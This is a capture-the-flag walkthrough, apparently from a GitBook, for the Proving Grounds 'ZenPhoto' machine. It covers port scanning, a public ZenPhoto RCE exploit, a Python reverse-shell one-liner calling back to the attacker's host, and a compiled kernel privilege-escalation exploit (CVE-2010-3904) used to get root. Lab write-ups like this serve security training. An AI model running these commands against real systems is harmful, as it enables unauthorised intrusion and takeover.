---
description: Pg Practice ZenPhoto writeup
---

# ZenPhoto

![](<../../../.gitbook/assets/image (790).png>)

## Nmap

```
192.168.59.41 -sS -sV -p-        

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

Given the open ports that we have and the versions running on them I am going to jump straight into port 80.

![http://192.168.59.41/](<../../../.gitbook/assets/image (743).png>)

The root page for the target machine takes us to a blank page headed 'UNDER CONSTRUCTION'. Ideally we should break out some directory enumeration and `nikto`.

`feroxbuster` and `nikto` both pick up the directory /test/ and subsequent directories.

![Feroxbuster](<../../../.gitbook/assets/image (744).png>)

![Nikto](<../../../.gitbook/assets/image (745).png>)

The /test/ directory takes us to the following page which as per the bottom right is running on ZenPhoto.

![](<../../../.gitbook/assets/image (746) (1).png>)

Viewing the page source and scrolling to the bottom reveals the exact version of ZenPhoto that we are running.

![](<../../../.gitbook/assets/image (747).png>)

## Exploitation

A quick Google search for a exploit on this version of ZenPhoto reveals a result for a RCE exploit.

{% embed url="https://www.exploit-db.com/exploits/18083" %}

I downloaded the exploit and run it with the following syntax:

```
php exploit.php <Target-IP> <ZenPhoto-Dir>
```

![](<../../../.gitbook/assets/image (748).png>)

## Stable Shell

We now have a shell on the target machine and we are running as the user www-data. I found with this shell that when you try changing directories or running scripts it would have unexpected behaviour.

I performed a quick check to see if python was installed using `which python`. After confirming Python is installed I tried a quick one liner reverse shell to see if we can get a more stable one.

First I started a `netcat` listener on my attacking machine:

```
sudo nc -lvp 443
```

The run the following command on the target machine:

```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

We now have a more stable shell.

![](<../../../.gitbook/assets/image (749).png>)

## Privilege Escalation

I then started a `Python SimpleHTTPServer` on my attacking machine and downloaded some scripts for privilege escalation.

![](<../../../.gitbook/assets/image (750).png>)

I executed `suggester.sh` which picked up the follow exploit as being 'highly probable'.

```
[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```

{% embed url="https://www.exploit-db.com/exploits/15285" %}

I downloaded the file onto the attacking machine using `wget` then compiled using `gcc`.

```
gcc exploit.c -o exploit
```

After compiling was finished I used `chmod` to make the exploit executable.

```
chmod +x exploit
```

I then executed the exploit and was able to gain a root shell.

![](<../../../.gitbook/assets/image (751) (1).png>)
